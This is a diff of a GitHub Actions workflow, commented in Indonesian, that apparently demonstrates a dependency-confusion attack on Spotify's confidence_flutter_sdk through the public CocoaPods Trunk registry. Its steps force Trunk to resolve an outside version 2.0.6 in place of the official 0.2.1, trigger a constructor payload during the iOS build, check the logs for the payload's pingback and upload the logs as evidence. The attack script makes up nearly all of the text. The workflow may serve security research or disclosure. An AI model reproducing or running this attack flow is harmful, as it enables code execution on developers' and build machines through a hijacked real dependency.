@@ -10,54 +10,51 @@ jobs:
         with:
           channel: 'stable'
 
-      - name: Execute Race Condition Hijack (Fresh Install Simulation)
+      - name: Execute Race Condition Hijack (Trunk Forced)
         run: |
-          # 1. INITIALIZATION
-          # Membangun environment dari nol layaknya CI/CD pipeline atau laptop baru dev.
+          # 1. INITIALIZATION: Simulasi Fresh Machine
           rm -rf rce_test
           flutter create rce_test
           cd rce_test
           
           # 2. OFFICIAL INTEGRATION STEP
-          # Menambah SDK sesuai instruksi README Spotify.
           echo "=== Adding SDK via Official Instructions ==="
           flutter pub add confidence_flutter_sdk:0.2.1
           
           cd ios
-          # Standar fix: Bypass platform version agar build tidak terhenti di Xcode 15+
+          # Standar fix build
           sed -i '' '1s/^/platform :ios, '"'"'16.0'"'"'\n/' Podfile
           
-          # 3. THE HIJACK (TRIGGERING GLOBAL RESOLUTION)
-          # Kita paksa CocoaPods update metadata dari registry publik.
-          # Karena Spotify tidak mengklaim nama ini di Trunk, v2.0.6 lu akan muncul sebagai opsi.
-          echo "=== Forcing Global Registry Lookup ==="
+          # 3. THE HIJACK (FORCING GLOBAL REGISTRY)
+          echo "=== Initalizing and Forcing Trunk CDN ==="
+          # Daftarin Trunk secara manual karena Runner seringkali 'kosong'
+          pod repo add-cdn trunk https://cdn.cocoapods.org/ || true
+          
+          # Force update metadata untuk mendeteksi v2.0.6 lu di publik
           pod repo update trunk
           
-          # Kita jalankan update spesifik. 
-          # Tanpa 'Podfile.lock' sebelumnya (karena fresh clone), 
-          # CocoaPods akan membandingkan Trunk vs Local. 
-          # Versi 2.0.6 lu akan menang secara algoritma SemVer.
+          echo "=== Triggering Dependency Confusion ==="
+          # Tanpa Podfile.lock, CocoaPods akan membandingkan Trunk (2.0.6) vs Local (0.2.1).
+          # Secara sistemik, SemVer v2.0.6 akan menang.
           pod update confidence_flutter_sdk --verbose 2>&1 | tee pod_update.log
           
-          echo "=== Verify Shadowing Success (Lockfile Audit) ==="
-          # Bukti krusial: Jika di sini tertulis 2.0.6, berarti symlink lokal berhasil dilewati.
+          echo "=== Verify Shadowing Success ==="
           grep -A 1 "confidence_flutter_sdk" Podfile.lock || echo "Hijack Failed: Still using local"
           
           cd ..
-          # 4. EXECUTION PHASE (TRIGGERING THE CONSTRUCTOR)
-          # Build akan memicu linking process, di mana __attribute__((constructor)) dieksekusi.
+          # 4. EXECUTION PHASE
           echo "=== Launching Build to Trigger Payload ==="
+          # Payload __attribute__((constructor)) akan tereksekusi saat linking
           flutter build ios --no-codesign 2>&1 | tee build.log || true
           
           echo "=== Final Audit Log (Search for Payload Execution) ==="
-          # Mencari jejak curl/pingback lu di logs Xcode
           grep -C 5 "Supply Chain Audit" build.log || echo "Payload signature not found"
 
       - name: Upload PoC Evidence
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: rce-evidence-race-condition
+          name: rce-evidence-race-v2.1
           path: |
             rce_test/ios/pod_update.log
             rce_test/ios/Podfile.lock
